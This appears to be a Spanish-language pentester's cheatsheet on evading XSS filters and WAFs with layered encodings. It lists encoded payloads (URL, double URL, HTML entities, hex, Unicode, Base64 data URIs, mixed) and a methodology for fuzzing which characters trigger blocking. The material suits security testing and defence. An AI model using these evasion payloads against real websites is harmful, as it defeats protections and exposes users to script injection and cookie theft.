---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Evasión de Filtros XSS y WAF mediante Codificaciones Múltiples

***

## Cheatsheet

|        **Tipo de Codificación**         |                **Payload Base**                | **Ejemplo de Payload Codificado**                                                                                                        |                                                                                  **Mecanismo y Contexto de Ejecución**                                                                                   |
| :-------------------------------------: | :--------------------------------------------: | :--------------------------------------------------------------------------------------------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
|        <br><br>**URL Encoding**         |      <br><br>`<script>alert(1)</script>`       | <br><pre><code>`%3Cscript%3Ealert%281%29%3C%2Fscript%3E`</code></pre>                                                                    |                                     Convierte caracteres especiales a `%` seguido de su valor hexadecimal. Útil cuando el vector se inyecta mediante parámetros GET.                                     |
| <br><br><br><br>**Double URL Encoding** | <br><br><br><br>`<img src=x onerror=alert(1)>` | <br><br><br><br><pre><code>`%253Cimg%20src%3Dx%20onerror%3Dalert%281%29%253E`</code></pre>                                               | Codifica el carácter `%` de una codificación previa en `%25`. Excelente cuando el servidor decodifica solo una vez antes de validar el input, pero la aplicación web realiza una segunda decodificación. |
|    <br><br><br><br>**HTML Entities**    |     <br><br><br><br>`javascript:alert(1)`      | <br><pre><code>`javascript&#58;alert&#40;1&#41;` </code></pre>o <br><pre><code>`javascrip&#116;&#58;alert(1)`</code></pre>               |             Utiliza referencias de caracteres (`&nombre;`, `&#decimal;`, o `&#xHex;`). El navegador siempre decodifica entidades HTML dentro de atributos antes de procesar la lógica de JS.             |
|  <br><br><br><br>**Hexadecimal (JS)**   |    <br><br><br><br>`alert(document.cookie)`    | <br><br><br><pre><code>`\x61\x6C\x65\x72\x74(document.cookie)`</code></pre>                                                              |           Representación en base 16 dentro de JavaScript, usando el prefijo `\x`. Permite evadir filtros que buscan palabras clave como `alert` o `cookie` directamente en bloques `<script>`.           |
|   <br><br><br><br>**Unicode Escapes**   |          <br><br><br><br>`prompt(1)`           | <br><br><br><pre><code>`\u0070\u0072\u006f\u006d\u0070\u0074(1)`</code></pre>                                                            |           Secuencias de escape Unicode `\uXXXX` dentro del motor JavaScript. Útiles cuando el payload se inyecta directamente dentro de un script existente o en controladores de eventos JS.            |
|         <br><br><br>**Base64**          |           <br><br><br>`alert('XSS')`           | <br><br><pre><code>`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">`</code></pre>                          |                                   Requiere evaluación en el lado del cliente (ej. `eval(atob(...))`) o el uso de Data URIs. Evade completamente firmas de texto plano.                                   |
|   <br><br><br>**Codificación Mixta**    |       <br><br><br>`javascript:alert(1)`        | <br><br><pre><code>`%6A%61%76%61%73%63%72%69%70%74%3A%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%28%31%29`</code></pre> |                                Combina múltiples esquemas para evadir filtros complejos. Se aprovecha de cadenas de decodificación largas (ej. URL -> HTML Entity -> JS).                                |
^xss-waf

### Metodología de Aplicación

- **Identificación del Contexto de Renderizado:** Analizo meticulosamente en qué parte del [[DOM]] aterriza el input (atributo de etiqueta, bloque de script puro, dentro de comillas, etc.). La codificación de Entidades HTML no funcionará si se inyecta dentro de un bloque `<script>` estándar, pero es letal dentro de atributos como `href=` o `onmouseover=`.
- **Análisis de la Cadena de Decodificación:** Verifico cuántas veces procesa el input la arquitectura del lado del servidor. Técnicas como el [[Double URL Encoding]] aprovechan la falta de consistencia entre los componentes de infraestructura (proxy inverso vs. aplicación backend).
- **Fuzzing Específico:** En lugar de codificar todo el payload de golpe, utilizo una aproximación granular para determinar exactamente qué caracteres o palabras clave (`<`, `>`, `script`, `alert`) desencadenan el bloqueo del [[WAF]], y procedo a ofuscar únicamente esos componentes.


---

## Overview

Al realizar auditorías de seguridad, es altamente probable que los vectores de ataque [[XSS]] directos (como `<script>alert(1)</script>`) sean neutralizados por un [[WAF]] o por funciones de sanitización en el backend. Para superar estas defensas, recurro a técnicas de evasión mediante codificaciones múltiples y mixtas.

El objetivo principal de esta estrategia es ofuscar la firma del payload malicioso para que las reglas de filtrado (basadas comúnmente en expresiones regulares o listas negras) no lo detecten. El éxito de la inyección depende de explotar la discrepancia entre cómo el filtro de seguridad interpreta la cadena y cómo el motor del navegador (HTML parser, JavaScript engine, URL parser) la decodifica antes de su ejecución. Dominar el orden de decodificación en el contexto de la vulnerabilidad es vital para construir un payload funcional.


___